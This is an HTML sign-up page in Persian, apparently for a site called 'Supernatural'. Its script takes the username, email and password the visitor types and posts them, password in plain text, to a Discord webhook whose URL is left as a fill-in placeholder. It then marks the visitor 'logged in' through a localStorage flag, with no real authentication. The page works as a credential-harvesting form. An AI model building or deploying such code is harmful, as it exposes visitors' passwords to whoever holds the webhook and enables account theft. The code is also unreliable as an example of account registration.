<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ثبت‌نام - Supernatural</title>
  <style>
    body { font-family: 'Rubik', sans-serif; background: #0e0e0e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .form-box { background: #1a1a1a; padding: 2rem; border-radius: 12px; width: 300px; text-align: center; }
    input { width: 100%; padding: 0.8rem; margin-bottom: 1rem; border: none; border-radius: 8px; background: #2a2a2a; color: #fff; }
    button { width: 100%; padding: 1rem; border: none; border-radius: 8px; background: #8a2be2; color: #fff; cursor: pointer; }
    button:hover { background: #6a1db7; }
  </style>
</head>
<body>
  <div class="form-box">
    <h2>ثبت‌نام</h2>
    <form id="registerForm">
      <input type="text" id="username" placeholder="نام کاربری" required>
      <input type="email" id="email" placeholder="ایمیل" required>
      <input type="password" id="password" placeholder="رمز عبور" required>
      <button type="submit">ثبت‌نام</button>
    </form>
  </div>

  <script>
    const webhookURL = "🔗 اینجا لینک وبهوک دیسکورد بذار";

    document.getElementById("registerForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const payload = {
        embeds: [{
          title: "📝 ثبت‌نام کاربر جدید",
          fields: [
            { name: "👤 نام کاربری", value: username },
            { name: "📧 ایمیل", value: email },
            { name: "🔒 رمز عبور", value: password }
          ],
          color: 15844367,
          timestamp: new Date()
        }]
      };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).then(res => {
        if (res.ok) {
          localStorage.setItem("loggedIn", "true");
          alert("✅ ثبت‌نام موفقیت‌آمیز بود!");
          window.location.href = "index.html";
        } else {
          alert("⚠️ خطا در ثبت‌نام!");
        }
      });
    });
  </script>
</body>
</html>
